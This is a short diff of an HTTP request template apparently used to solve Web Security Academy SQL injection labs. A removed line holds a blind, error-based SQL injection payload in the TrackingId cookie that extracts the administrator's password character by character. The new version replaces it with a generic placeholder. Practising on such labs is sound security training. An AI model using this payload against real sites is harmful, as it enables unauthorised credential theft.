@@ -1,6 +1,6 @@
-GET /filter?category=Gifts HTTP/2
-Host: 0a9f00cb037511c580af085d002900bd.web-security-academy.net
-Cookie: TrackingId=C45KfPMrhWE9vFdw'||(SELECT CASE WHEN SUBSTR(password,$pos$,1)$op$'$char$' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'; session=eh4fGSgCUztMSFgrXCbW46Ws5UvgRW1g
+GET /filter?category=Pets HTTP/2
+Host: 0a8300bd04986d6080c908fb00bb0087.web-security-academy.net
+Cookie: TrackingId=8MzdHMelaTZPUK2h$req$; session=aZLR7pPzY5Qk8hHtxkRitur2LpQ163C6
 Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
 Sec-Ch-Ua-Mobile: ?0
 Sec-Ch-Ua-Platform: "Linux"
@@ -12,7 +12,7 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: navigate
 Sec-Fetch-User: ?1
 Sec-Fetch-Dest: document
-Referer: https://0a9f00cb037511c580af085d002900bd.web-security-academy.net/
+Referer: https://0a8300bd04986d6080c908fb00bb0087.web-security-academy.net/filter?category=Pets
 Accept-Encoding: gzip, deflate, br
 Priority: u=0, i
 
